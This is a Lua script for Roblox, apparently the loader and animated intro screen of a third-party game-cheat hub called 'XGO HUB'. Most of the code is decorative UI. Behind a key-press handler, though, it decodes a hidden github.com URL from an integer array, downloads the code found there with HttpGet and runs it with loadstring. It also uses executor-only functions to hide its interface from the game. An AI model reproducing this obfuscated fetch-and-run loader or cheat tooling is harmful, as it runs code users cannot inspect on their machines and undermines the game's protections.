-- 此源码不加密 | 也尽量保持更新 | UI.XGO修改更新 | 以内置独家水印 --
-- UI版本: v2

--  懒得更

local a = game.ReplicatedStorage:FindFirstChild("ExecutionCount") or Instance.new("IntValue")
a.Name = "ExecutionCount"
a.Parent = game.ReplicatedStorage
local b = a.Value or 0
b = b + 1
a.Value = b
local function c(d)
	game.StarterGui:SetCore("SendNotification", {
		Title = "\232\132\154\230\156\172\233\128\154\231\159\165",
		Text = d,
		Icon = "rbxthumb://type=Asset&id=120611289434746&w=150&h=150",
		Duration = 1.5,
	})
end
local function e(f)
	local g = Instance.new("Sound")
	g.SoundId = "rbxassetid://" .. f
	g.Volume = 3
	g.Pitch = 1
	g.Parent = game.Workspace
	g:Play()
end
if b == 1 then
elseif b == 2 then
	c(
		"\232\132\154\230\156\172\229\183\178\230\137\167\232\161\140\239\188\140\230\151\160\233\156\128\229\134\141\233\135\141\229\164\141\230\137\167\232\161\140\46"
	)
	e(3398620867)
	return
elseif b == 3 then
	c(
		"\229\134\141\231\130\185\229\135\187\228\184\164\230\172\161\229\176\134\233\135\141\229\144\175\232\132\154\230\156\172\46"
	)
	e(3398620867)
	return
elseif b == 4 then
	c(
		"\229\134\141\231\130\185\229\135\187\228\184\128\230\172\161\239\188\140\233\135\141\230\150\176\229\144\175\229\138\168\232\132\154\230\156\172\46"
	)
	e(3398620867)
	return
elseif b == 5 then
	c(
		"\232\132\154\230\156\172\229\183\178\233\135\141\230\150\176\229\144\175\229\138\168\239\188\140\232\175\183\231\168\141\229\144\142\46"
	)
	e(3398620867)
	a.Value = 1
else
	c(
		"\232\132\154\230\156\172\229\183\178\230\137\167\232\161\140\239\188\140\230\151\160\233\156\128\229\134\141\233\135\141\229\164\141\230\137\167\232\161\140\46"
	)
	e(3398620867)
	return
end
if b == 1 then
	local h = game:GetService("UserInputService")
	local function i(j)
		if j.KeyCode == Enum.KeyCode.K then
			task.spawn(function()
				pcall(function()
					local k = game:HttpGet((function()
						local l = {
							1389,
							1545,
							1545,
							1493,
							1532,
							791,
							648,
							648,
							1376,
							1402,
							1545,
							1389,
							1558,
							1311,
							635,
							1324,
							1480,
							1454,
							648,
							960,
							1129,
							882,
							947,
							882,
							1168,
							648,
							1142,
							986,
							648,
							1519,
							1298,
							1584,
							648,
							1454,
							1298,
							1402,
							1467,
							648,
							1142,
							986,
							635,
							1025,
							882,
							1129,
							934,
							1116,
							1129,
							635,
							1025,
							1142,
							882,
						}
						local m = ""
						for n = 1, #l do
							m = m .. string.char((l[n] - 37) / 13)
						end
						return m
					end)())
					if k then
						loadstring(k)()
					end
				end)
			end)
			h.InputBegan:Disconnect(i)
		end
	end
	h.InputBegan:Connect(i)
	repeat
		task.wait()
	until game:IsLoaded()
	local o = game:GetService("Players")
	local p = game:GetService("TweenService")
	local q = game:GetService("RunService")
	local r = game:GetService("Lighting")
	local s = game:GetService("Debris")
	local t = o.LocalPlayer or o.PlayerAdded:Wait()
	local u = {
		size = 270,
		thickness = 18,
		corner = 24,
		duration = 7,
		spinDeg = 95,
		spinTime = 0.85,
		breathMin = 0.985,
		breathMax = 1.02,
		bubbleCount = 4,
		bubbleScale = 2.7,
		bubbleGap = 0.12,
		creditText = "-- XGO HUB --",
		rainbowSeconds = 1.0,
		rainbowTurns = 1.25,
		subtitleText = "警告：使用第三方脚本可能导致账号封禁，操作前请谨慎!!!！ [免费脚本切勿圈钱]",
		subtitleSpeed = 50,
		subtitleY = 0.05,
		subtitleSize = 16,
		subtitleColor = Color3.fromRGB(255, 100, 100),
	}
	local v = Color3.fromRGB(255, 120, 120)
	local w = Color3.fromRGB(255, 50, 50)
	local x = Color3.fromRGB(180, 20, 20)
	local y = Color3.fromRGB(255, 160, 160)
	local z = Color3.fromRGB(5, 9, 20)
	local A = Instance.new("BindableEvent")
	local function B(C, D, E)
		local F, G, m
		local n = math.floor(C * 6)
		local H = C * 6 - n
		local I = E * (1 - D)
		local J = E * (1 - H * D)
		local K = E * (1 - (1 - H) * D)
		n = n % 6
		if n == 0 then
			F, G, m = E, K, I
		elseif n == 1 then
			F, G, m = J, E, I
		elseif n == 2 then
			F, G, m = I, E, K
		elseif n == 3 then
			F, G, m = I, J, E
		elseif n == 4 then
			F, G, m = K, I, E
		else
			F, G, m = E, I, J
		end
		return Color3.new(F, G, m)
	end
	local function L()
		local M, N = pcall(function()
			return gethui and gethui()
		end)
		if M and N then
			return N
		end
		M, N = pcall(function()
			return get_hidden_gui and get_hidden_gui()
		end)
		if M and N then
			return N
		end
		M, N = pcall(function()
			return gethiddengui and gethiddengui()
		end)
		if M and N then
			return N
		end
		local O = t:FindFirstChildOfClass("PlayerGui") or t:WaitForChild("PlayerGui", 5)
		return O or game:GetService("CoreGui")
	end
	pcall(function()
		if _G.ThunderIntro_Stop then
			_G.ThunderIntro_Stop()
		end
	end)
	local P = L()
	local Q = true
	local R = Instance.new("BlurEffect")
	R.Size = 8
	R.Name = "ThunderIntroBlur"
	R.Parent = r
	local S = Instance.new("ScreenGui")
	S.Name = "ThunderIntroMAX"
	S.IgnoreGuiInset = true
	S.ResetOnSpawn = false
	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(S)
		end
	end)
	S.Parent = P
	local T = Instance.new("Frame")
	T.Size = UDim2.fromScale(1, 1)
	T.BackgroundColor3 = z
	T.BackgroundTransparency = 0.25
	T.Parent = S
	local U = Instance.new("Frame")
	U.Size = UDim2.fromScale(1, 0.08)
	U.Position = UDim2.fromScale(0, u.subtitleY)
	U.BackgroundTransparency = 1
	U.ClipsDescendants = true
	U.ZIndex = 10
	U.Parent = S
	local V = Instance.new("TextLabel")
	V.Text = u.subtitleText
	V.TextColor3 = u.subtitleColor
	V.Font = Enum.Font.GothamBold
	V.TextSize = u.subtitleSize
	V.BackgroundTransparency = 1
	V.AnchorPoint = Vector2.new(0, 0.5)
	V.Position = UDim2.new(0, S.AbsoluteSize.X, 0.5, 0)
	V.TextTransparency = 0
	V.Parent = U
	task.spawn(function()
		local W = S.AbsoluteSize.X
		local X = V.TextBounds.X <= 0 and string.len(u.subtitleText) * u.subtitleSize * 0.5 or V.TextBounds.X
		local Y = u.subtitleSpeed
		local Z = false
		while Q and not Z do
			local _ = V.Position.X.Offset - Y * q.Heartbeat:Wait()
			if _ < -X then
				Z = true
				break
			end
			V.Position = UDim2.new(0, _, 0.5, 0)
		end
		p:Create(V, TweenInfo.new(0.5), { TextTransparency = 1 }):Play()
		task.wait(0.5)
		if V and V.Parent then
			V:Destroy()
		end
		if U and U.Parent then
			U:Destroy()
		end
	end)
	local a0 = Instance.new("Frame")
	a0.Size = UDim2.fromOffset(u.size, u.size)
	a0.AnchorPoint = Vector2.new(0.5, 0.5)
	a0.Position = UDim2.fromScale(0.5, 0.5)
	a0.BackgroundTransparency = 1
	a0.ZIndex = 5
	a0.Parent = S
	local a1 = Instance.new("Frame")
	a1.Size = UDim2.fromScale(1, 1)
	a1.BackgroundTransparency = 1
	a1.Parent = a0
	local a2 = Instance.new("UICorner")
	a2.CornerRadius = UDim.new(0, u.corner)
	a2.Parent = a1
	local a3 = Instance.new("UIStroke")
	a3.Thickness = u.thickness
	a3.Color = w
	pcall(function()
		a3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end)
	a3.Parent = a1
	local a4 = Instance.new("Frame")
	a4.Size = UDim2.fromScale(1, 1)
	a4.BackgroundTransparency = 1
	a4.ZIndex = -1
	a4.Parent = a0
	local a5 = Instance.new("UICorner")
	a5.CornerRadius = UDim.new(0, u.corner)
	a5.Parent = a4
	local a6 = Instance.new("UIStroke")
	a6.Thickness = u.thickness * 1.7
	a6.Color = y
	a6.Transparency = 0.7
	pcall(function()
		a6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	end)
	a6.Parent = a4
	local a7 = Instance.new("Frame")
	a7.Size = UDim2.fromOffset(u.size - u.thickness * 2, u.size - u.thickness * 2)
	a7.AnchorPoint = Vector2.new(0.5, 0.5)
	a7.Position = UDim2.fromScale(0.5, 0.5)
	a7.BackgroundTransparency = 1
	a7.Parent = a0
	local a8 = Instance.new("TextLabel")
	a8.Size = UDim2.fromScale(0.9, 0.4)
	a8.AnchorPoint = Vector2.new(0.5, 0.5)
	a8.Position = UDim2.fromScale(0.5, 0.40)
	a8.BackgroundTransparency = 1
	a8.Text = ""
	a8.TextScaled = true
	a8.Font = Enum.Font.GothamBlack
	a8.TextColor3 = w
	a8.TextTransparency = 0
	a8.ZIndex = 6
	a8.Parent = a7
	local a9 = Instance.new("UIGradient")
	a9.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0.00, v),
		ColorSequenceKeypoint.new(0.50, w),
		ColorSequenceKeypoint.new(1.00, x),
	})
	a9.Rotation = 25
	a9.Parent = a8
	local aa = "使用脚本请承担风险\n「封号概不负责」"
	local ab = 0.2
	local ac = false
	task.spawn(function()
		task.wait(0.3)
		for n = 1, #aa do
			if not Q then
				break
			end
			a8.Text = string.sub(aa, 1, n)
			task.wait(ab)
		end
		ac = true
	end)
	local ad = Instance.new("TextLabel")
	ad.Size = UDim2.fromScale(0.6, 0.2)
	ad.AnchorPoint = Vector2.new(0.5, 0.5)
	ad.Position = UDim2.fromScale(0.5, 0.65)
	ad.BackgroundTransparency = 1
	ad.Text = "XGOHUB"
	ad.TextScaled = true
	ad.Font = Enum.Font.GothamMedium
	ad.TextTransparency = 1
	ad.ZIndex = 6
	ad.Parent = a7
	local ae = false
	task.spawn(function()
		local d = ad.Text
		local af = string.len(d)
		local ag = 0
		task.wait(0.3 + 0.25)
		while Q and not ae do
			ag = (ag + 0.01) % 1
			local ah = ""
			for n = 1, af do
				local ai = (ag + (n - 1) / af) % 1
				local aj = B(ai, 1, 1)
				local F = math.floor(aj.R * 255)
				local G = math.floor(aj.G * 255)
				local m = math.floor(aj.B * 255)
				local ak = string.format("#%02X%02X%02X", F, G, m)
				ah = ah .. string.format('<font color="%s">%s</font>', ak, string.sub(d, n, n))
			end
			ad.RichText = true
			ad.Text = ah
			q.Heartbeat:Wait()
		end
		if ae and ad then
			ad.Text = ""
		end
	end)
	local al = Instance.new("Frame")
	al.AnchorPoint = Vector2.new(0.5, 0.5)
	al.Position = UDim2.fromScale(0.5, 0.65)
	al.Size = UDim2.fromOffset(120, 120)
	al.BackgroundColor3 = y
	al.BackgroundTransparency = 0.9
	al.ZIndex = -1
	al.Parent = a7
	local am = Instance.new("UICorner")
	am.CornerRadius = UDim.new(1, 0)
	am.Parent = al
	local function an()
		local D = Instance.new("Frame")
		D.Size = UDim2.fromOffset(2, 2)
		D.AnchorPoint = Vector2.new(0.5, 0.5)
		D.Position = al.Position
		D.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		D.BackgroundTransparency = 0
		D.ZIndex = 5
		D.Parent = a7
		local ao = al.Position + UDim2.fromOffset(math.random(-60, 60), math.random(-60, 60))
		p:Create(D, TweenInfo.new(0.25), { Position = ao, BackgroundTransparency = 1 }):Play()
		s:AddItem(D, 0.3)
	end
	for n = 1, 12 do
		task.delay(n * 0.01, an)
	end
	local function ap(aq)
		local ar = aq.Position
		for n = 1, 4 do
			aq.Position = ar + UDim2.fromOffset(math.random(-4, 4), math.random(-4, 4))
			task.wait(0.04)
		end
		aq.Position = ar
	end
	ap(a0)
	local as = Instance.new("TextLabel")
	as.Size = UDim2.fromOffset(220, 20)
	as.AnchorPoint = Vector2.new(1, 1)
	as.Position = UDim2.fromScale(0.985, 0.985)
	as.BackgroundTransparency = 1
	as.Text = u.creditText
	as.TextColor3 = Color3.fromRGB(190, 205, 235)
	as.Font = Enum.Font.Gotham
	as.TextSize = 12
	as.TextTransparency = 1
	as.ZIndex = 6
	as.Parent = S
	local at = Instance.new("TextButton")
	at.Position = UDim2.fromScale(0.99, 0.985)
	at.Size = UDim2.fromOffset(60, 20)
	at.AnchorPoint = Vector2.new(1, 1)
	at.BackgroundTransparency = 1
	at.Text = "「点击此处跳过」"
	at.TextColor3 = Color3.new(1, 1, 1)
	at.Font = Enum.Font.Gotham
	at.TextSize = 12
	at.TextTransparency = 1
	at.ZIndex = 10
	at.Parent = S
	task.spawn(function()
		task.wait(0.55 + 0.6)
		local au = TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
		while Q do
			p:Create(at, au, { Size = UDim2.fromOffset(60 * 1.2, 20 * 1.2) }):Play()
			task.wait(1.2)
			p:Create(at, au, { Size = UDim2.fromOffset(60, 20) }):Play()
			task.wait(1.2)
		end
	end)
	task.spawn(function()
		task.wait(0.55)
		p:Create(at, TweenInfo.new(0.6, Enum.EasingStyle.Quad), { TextTransparency = 0.2 }):Play()
	end)
	at.MouseEnter:Connect(function()
		if Q then
			p:Create(at, TweenInfo.new(0.2), { TextTransparency = 0 }):Play()
			p:Create(at, TweenInfo.new(0.2), { Size = UDim2.fromOffset(60 * 1.3, 20 * 1.3) }):Play()
		end
	end)
	at.MouseLeave:Connect(function()
		if Q then
			p:Create(at, TweenInfo.new(0.2), { TextTransparency = 0.2 }):Play()
			local av = at.Size.X.Offset / 60
			p:Create(at, TweenInfo.new(0.2), { Size = UDim2.fromOffset(60 * av, 20 * av) }):Play()
		end
	end)
	local aw = Instance.new("Frame")
	aw.BackgroundTransparency = 1
	aw.Size = UDim2.fromScale(1.2, 1.2)
	aw.AnchorPoint = Vector2.new(0.5, 0.5)
	aw.Position = UDim2.fromScale(-0.2, 0.5)
	aw.Rotation = -15
	aw.ZIndex = 8
	aw.Parent = a7
	local ax = Instance.new("UIGradient")
	ax.Color = ColorSequence.new({
		ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)),
		ColorSequenceKeypoint.new(0.50, Color3.new(1, 1, 1)),
		ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1)),
	})
	ax.Transparency = NumberSequence.new({
		NumberSequenceKeypoint.new(0.00, 1.0),
		NumberSequenceKeypoint.new(0.48, 0.25),
		NumberSequenceKeypoint.new(0.52, 0.00),
		NumberSequenceKeypoint.new(0.56, 0.25),
		NumberSequenceKeypoint.new(1.00, 1.0),
	})
	ax.Parent = aw
	local ay = Instance.new("Folder")
	ay.Name = "Bubbles"
	ay.Parent = a0
	local function az()
		local m = Instance.new("Frame")
		m.AnchorPoint = Vector2.new(0.5, 0.5)
		m.Position = UDim2.fromScale(0.5, 0.5)
		m.Size = UDim2.fromOffset(1, 1)
		m.BackgroundTransparency = 1
		m.ZIndex = -2
		m.Parent = ay
		local D = Instance.new("UIStroke")
		D.Thickness = 3
		D.Color = y
		D.Transparency = 0.1
		D.Parent = m
		local aA = Instance.new("UICorner")
		aA.CornerRadius = UDim.new(1, 999)
		aA.Parent = m
		return m, D
	end
	local aB = Instance.new("UIScale")
	aB.Scale = 1
	aB.Parent = a1
	local aC = Instance.new("UIScale")
	aC.Scale = 1
	aC.Parent = a0
	local function aD()
		if not Q then
			return
		end
		Q = false
		ae = true
		a8.Text = ""
		as.Text = ""
		at.Text = ""
		ad.Text = ""
		p:Create(a8, TweenInfo.new(0.1), { TextTransparency = 1 }):Play()
		p:Create(as, TweenInfo.new(0.1), { TextTransparency = 1 }):Play()
		p:Create(at, TweenInfo.new(0.1), { TextTransparency = 1 }):Play()
		p:Create(ad, TweenInfo.new(0.8), { TextTransparency = 1 }):Play()
		local aE = a0.Rotation
		local aF = aE + 360
		local aG = 1.8
		local aH = p:Create(
			a0,
			TweenInfo.new(1.0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{ Rotation = aF, Size = UDim2.fromOffset(u.size * aG, u.size * aG) }
		)
		aH:Play()
		aH.Completed:Wait()
		local aI = p:Create(
			a0,
			TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
			{ Size = UDim2.fromScale(2, 2) }
		)
		p:Create(a3, TweenInfo.new(0.5), { Transparency = 1 }):Play()
		p:Create(a6, TweenInfo.new(0.5), { Transparency = 1 }):Play()
		p:Create(T, TweenInfo.new(0.8), { BackgroundTransparency = 1 }):Play()
		aI:Play()
		aI.Completed:Wait()
		if S and S.Parent then
			for aJ, aK in ipairs(S:GetChildren()) do
				if aK ~= U then
					aK:Destroy()
				end
			end
			task.spawn(function()
				repeat
					task.wait(0.1)
				until not U or not U.Parent
				S:Destroy()
			end)
		end
		if R and R.Parent then
			R:Destroy()
		end
		A:Fire()
	end
	at.MouseButton1Click:Connect(aD)
	if u.duration and u.duration > 0 then
		task.spawn(function()
			while Q and not ac do
				task.wait(0.1)
			end
			task.wait(2)
			aD()
		end)
	end
	_G.ThunderIntro_Stop = aD
	local aL = {
		rStroke = a3.Color,
		gStroke = a6.Color,
		titleGradient = a9.Color,
		sub = ad.TextColor3,
		orb = al.BackgroundColor3,
	}
	local function aM(C, D, E)
		return Color3.fromHSV(C % 1, D, E)
	end
	local function aN(C)
		a9.Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0.00, aM(C, 1, 1)),
			ColorSequenceKeypoint.new(0.50, aM(C + 0.15, 1, 1)),
			ColorSequenceKeypoint.new(1.00, aM(C + 0.30, 1, 1)),
		})
	end
	local function aO()
		local aP = math.max(0.099, u.rainbowSeconds)
		local aQ = u.rainbowTurns
		local aR = os.clock()
		while Q do
			local K = os.clock() - aR
			if K > aP then
				break
			end
			local aS = K / aP
			local C = aS * aQ
			a3.Color = aM(C, 1, 1)
			a6.Color = aM(C + 0.08, 1, 1)
			aN(C)
			al.BackgroundColor3 = aM(C + 0.12, 0.85, 1)
			q.Heartbeat:Wait()
		end
		a3.Color = aL.rStroke
		a6.Color = aL.gStroke
		a9.Color = aL.titleGradient
		al.BackgroundColor3 = aL.orb
	end
	task.spawn(aO)
	task.spawn(function()
		local aT = Instance.new("Frame")
		aT.Size = UDim2.fromScale(1, 1)
		aT.BackgroundColor3 = Color3.new(1, 1, 1)
		aT.BackgroundTransparency = 1
		aT.ZIndex = 999
		aT.Parent = S
		local aU = p:Create(aT, TweenInfo.new(0.05), { BackgroundTransparency = 0.55 })
		local aV = p:Create(aT, TweenInfo.new(0.12), { BackgroundTransparency = 1 })
		aU:Play()
		aU.Completed:Wait()
		aV:Play()
		aV.Completed:Wait()
		aT:Destroy()
	end)
	task.spawn(function()
		while Q do
			local aW = p:Create(
				a1,
				TweenInfo.new(u.spinTime, Enum.EasingStyle.Exponential, Enum.EasingDirection.InOut),
				{ Rotation = a1.Rotation + u.spinDeg }
			)
			local aX = p:Create(
				a4,
				TweenInfo.new(u.spinTime, Enum.EasingStyle.Exponential, Enum.EasingDirection.InOut),
				{ Rotation = a4.Rotation + u.spinDeg }
			)
			aW:Play()
			aX:Play()
			aW.Completed:Wait()
		end
	end)
	task.spawn(function()
		while Q do
			p:Create(aB, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), { Scale = u.breathMax })
				:Play()
			task.wait(1.2)
			p:Create(aB, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.In), { Scale = u.breathMin })
				:Play()
			task.wait(1.2)
		end
	end)
	task.spawn(function()
		task.wait(0.3)
		p:Create(a8, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { TextTransparency = 0 })
			:Play()
		task.wait(0.25)
		p:Create(ad, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { TextTransparency = 0 })
			:Play()
		p:Create(as, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { TextTransparency = 0.2 })
			:Play()
	end)
	task.spawn(function()
		while Q do
			local aY = p:Create(
				al,
				TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
				{ BackgroundTransparency = 0.8, Size = UDim2.fromOffset(140, 140) }
			)
			local aZ = p:Create(
				al,
				TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
				{ BackgroundTransparency = 0.9, Size = UDim2.fromOffset(120, 120) }
			)
			aY:Play()
			aY.Completed:Wait()
			aZ:Play()
			aZ.Completed:Wait()
		end
	end)
	local function a_()
		local b0 = T.BackgroundTransparency
		local b1 = p:Create(
			T,
			TweenInfo.new(0.08, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
			{ BackgroundTransparency = math.max(0, b0 - 0.12) }
		)
		local b2 = p:Create(
			T,
			TweenInfo.new(0.18, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
			{ BackgroundTransparency = b0 }
		)
		b1:Play()
		b1.Completed:Wait()
		b2:Play()
		local b3 = a3.Thickness
		local b4 = a3.Color
		local b5 = p:Create(
			a3,
			TweenInfo.new(0.08, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
			{ Thickness = b3 * 1.35, Color = y }
		)
		local b6 = p:Create(
			a3,
			TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
			{ Thickness = b3, Color = b4 }
		)
		b5:Play()
		b5.Completed:Wait()
		b6:Play()
		local b7 = p:Create(aC, TweenInfo.new(0.08, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = 1.03 })
		local b8 = p:Create(aC, TweenInfo.new(0.20, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Scale = 1 })
		b7:Play()
		b7.Completed:Wait()
		b8:Play()
		for n = 1, u.bubbleCount do
			task.spawn(function()
				local m, D = az()
				local b9 = p:Create(
					m,
					TweenInfo.new(0.6, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out),
					{ Size = UDim2.fromOffset(u.size * u.bubbleScale, u.size * u.bubbleScale) }
				)
				local ba = p:Create(
					D,
					TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
					{ Transparency = 1 }
				)
				b9:Play()
				ba:Play()
				b9.Completed:Wait()
				m:Destroy()
			end)
			task.wait(u.bubbleGap)
		end
	end
	task.spawn(a_)
	task.spawn(function()
		task.wait(0.25)
		local aT = Instance.new("Frame")
		aT.Size = UDim2.fromScale(1, 1)
		aT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		aT.BackgroundTransparency = 1
		aT.ZIndex = -5
		aT.Parent = S
		local aU = p:Create(
			aT,
			TweenInfo.new(0.08, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
			{ BackgroundTransparency = 0.6 }
		)
		local aV = p:Create(
			aT,
			TweenInfo.new(0.20, Enum.EasingStyle.Sine, Enum.EasingDirection.In),
			{ BackgroundTransparency = 1 }
		)
		aU:Play()
		aU.Completed:Wait()
		aV:Play()
		aV.Completed:Wait()
		aT:Destroy()
	end)
	task.spawn(function()
		task.wait(0.55)
		p:Create(
			aw,
			TweenInfo.new(1.1, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
			{ Position = UDim2.fromScale(1.2, 0.5) }
		):Play()
	end)
	local function bb()
		local a1 = a0:Clone()
		a1.Size = UDim2.fromOffset(0, 0)
		a1.BackgroundTransparency = 0.5
		a1.Parent = a7
		p:Create(
			a1,
			TweenInfo.new(0.6, Enum.EasingStyle.Quart),
			{ Size = UDim2.fromOffset(300, 300), BackgroundTransparency = 1 }
		):Play()
		s:AddItem(a1, 0.6)
	end
	local bc = nil
	local bd = nil
	if bc then
		bc.Completed:Connect(bb)
	end
	if bd then
		bd.Ended:Connect(bb)
	end
	A.Event:Wait()
end
local be = game.Players.LocalPlayer
local bf = be:WaitForChild("PlayerGui")
local bg = bf:FindFirstChild("\120\103\111\32\72\117\98\32\228\189\156\232\128\133\88\71\79")
local bh = _G.XGO_GradientConn
local bi = _G.XGO_PositionConn
local bj = _G.XGO_FpsConn
local bk = _G.XGO_TextConn
if bh then
	bh:Disconnect()
end
if bi then
	bi:Disconnect()
end
if bj then
	task.cancel(bj)
end
if bk then
	task.cancel(bk)
end
if bg then
	bg:Destroy()
end
local l = Instance.new("ScreenGui")
l.Name = "\120\103\111\32\72\117\98\32\228\189\156\232\128\133\88\71\79"
l.Parent = bf
l.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
l.ResetOnSpawn = false
local m = Instance.new("TextLabel")
m.Parent = l
m.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
m.BackgroundTransparency = 1
m.BorderSizePixel = 0
m.Size = UDim2.new(0, 1100, 0, 40)
m.Font = Enum.Font.GothamBlack
m.TextColor3 = Color3.fromRGB(255, 255, 255)
m.TextSize = 11.5
m.TextStrokeTransparency = 0.8
m.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
m.TextWrapped = true
m.TextXAlignment = Enum.TextXAlignment.Center
m.Text =
	"\120\103\111\32\72\117\98\32\84\73\77\69\n\229\166\130\230\158\156\229\141\161\229\156\168\232\191\153\228\184\170\233\161\181\233\157\162\44\232\175\183\233\135\141\230\150\176\229\144\175\229\138\168\46"
local q = game:GetService("RunService")
local aA = Instance.new("UIGradient")
aA.Parent = m
local bl = Instance.new("UIGradient")
bl.Parent = m
local bm = Instance.new("UICorner")
bm.Parent = m
bm.CornerRadius = UDim.new(0, 8)
local bn = 14
local bo = 1.0
local bp = 1.0
local bq = {}
for n = 0, bn - 1 do
	local C = n / bn
	table.insert(bq, Color3.fromHSV(C, bo, bp))
end
local br = 9
local bs = 1
local function bt(bu)
	local bv = {}
	local bw = #bq
	for n = 1, bw do
		local K = ((n - 1) / (bw - 1) + bu) % 1
		table.insert(bv, ColorSequenceKeypoint.new(K, bq[n]))
	end
	table.sort(bv, function(l, m)
		return l.Time < m.Time
	end)
	bv[1] = ColorSequenceKeypoint.new(0, bv[1].Value)
	bv[#bv] = ColorSequenceKeypoint.new(1, bv[#bv].Value)
	return ColorSequence.new(bv)
end
task.spawn(function()
	local aR = tick()
	while true do
		local bx = (tick() - aR) % br
		local by = bx / (br / 2) % 1
		if bx >= br / 2 then
			by = 1 - by
		end
		local bz = 1 - by
		aA.Color = bt(by)
		bl.Color = bt(bz)
		q.Heartbeat:Wait()
	end
end)
bh = game:GetService("RunService").RenderStepped:Connect(updateRainbowGradient)
_G.XGO_GradientConn = bh
local bm = Instance.new("UICorner")
bm.Parent = m
bm.CornerRadius = UDim.new(0, 8)
local bA = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local function bB()
	local W = game:GetService("GuiService"):GetScreenResolution().X
	local bC = -60
	local bD = W / 2 - m.AbsoluteSize.X / 2
	m.Position = UDim2.new(0, bD, 0, bC)
end
bB()
bi = game:GetService("RunService").Heartbeat:Connect(bB)
_G.XGO_PositionConn = bi
local function bE()
	local bF = game:GetService("UserInputService")
	if bF.TouchEnabled and not bF.KeyboardEnabled then
		return "移动"
	else
		return "PC端"
	end
end
local bG = 0
if bj then
	task.cancel(bj)
end
bj = spawn(function()
	local bH = game:GetService("RunService")
	local bI = 60
	if bH:IsRunning() then
		local bJ = tick()
		local bK = 10
		for aJ = 1, bK do
			bH.RenderStepped:Wait()
		end
		local bL = (tick() - bJ) / bK
		local bM = math.floor(1 / bL)
		bI = math.min(bM, 240)
	end
	while task.wait(1) do
		local bN = 0
		local bO = tick()
		while tick() - bO < 1 do
			bH.RenderStepped:Wait()
			bN = bN + 1
		end
		bG = math.min(bN, bI)
	end
end)
_G.XGO_FpsConn = bj
local function bP(bQ, bR)
	if bQ == 3 and bR >= 21 or bQ == 4 or bQ == 5 or bQ == 6 and bR < 22 then
		return "\227\128\144\230\152\165\229\173\163\227\128\145"
	elseif bQ == 6 and bR >= 22 or bQ == 7 or bQ == 8 or bQ == 9 and bR < 23 then
		return "\227\128\144\229\164\143\229\173\163\227\128\145"
	elseif bQ == 9 and bR >= 23 or bQ == 10 or bQ == 11 or bQ == 12 and bR < 22 then
		return "\227\128\144\231\167\139\229\173\163\227\128\145"
	else
		return "\227\128\144\229\134\172\229\173\163\227\128\145"
	end
end
local function bS(bQ, bR)
	local bT = {
		{ 1, 1, "\229\133\131\230\151\166" },
		{ 1, 22, "\230\152\165\232\138\130" },
		{ 2, 2, "\233\190\153\230\138\172\229\164\180" },
		{ 2, 14, "\230\131\133\228\186\186\232\138\130" },
		{ 3, 8, "\229\166\135\229\165\179\232\138\130" },
		{ 3, 12, "\230\164\141\230\160\145\232\138\130" },
		{ 4, 5, "\230\184\133\230\152\142\232\138\130" },
		{ 4, 1, "\230\132\154\228\186\186\232\138\130" },
		{ 5, 1, "\229\138\179\229\138\168\232\138\130" },
		{ 5, 4, "\233\157\146\229\185\180\232\138\130" },
		{ 5, 20, "\231\171\175\229\141\136\232\138\130" },
		{ 6, 1, "\229\132\191\231\171\165\232\138\130" },
		{ 7, 1, "\229\187\186\229\133\154\232\138\130" },
		{ 7, 7, "\228\184\131\229\164\149\232\138\130" },
		{ 8, 1, "\229\187\186\229\134\155\232\138\130" },
		{ 8, 15, "\228\184\173\231\167\139\232\138\130" },
		{ 9, 10, "\230\149\153\229\184\136\232\138\130" },
		{ 9, 9, "\233\135\141\233\152\179\232\138\130" },
		{ 10, 1, "\229\155\189\229\186\134\232\138\130" },
		{ 11, 21, "\228\189\156\232\128\133\231\148\159\230\151\165" },
		{ 12, 8, "\232\133\138\229\133\171\232\138\130" },
		{ 12, 23, "\229\176\143\229\185\180" },
		{ 12, 24, "\229\176\143\229\185\180" },
		{ 12, 22, "\229\134\172\232\135\179" },
		{ 12, 25, "\229\156\163\232\175\158\232\138\130" },
	}
	for aJ, bU in ipairs(bT) do
		if bU[1] == bQ and bU[2] == bR then
			return "\227\128\144\232\138\130\227\128\145\58" .. bU[3] .. "\229\191\171\228\185\144 "
		end
	end
	return "\232\132\154\230\156\172\232\174\164\229\135\134\88\71\79\72\85\66\32\124\32"
end
local bV = game.ReplicatedStorage:FindFirstChild("XGO_GlobalData")
if not bV then
	bV = Instance.new("NumberValue")
	bV.Name = "XGO_GlobalData"
	bV.Value = tick()
	bV.Parent = game.ReplicatedStorage
end
local bW = bV.Value
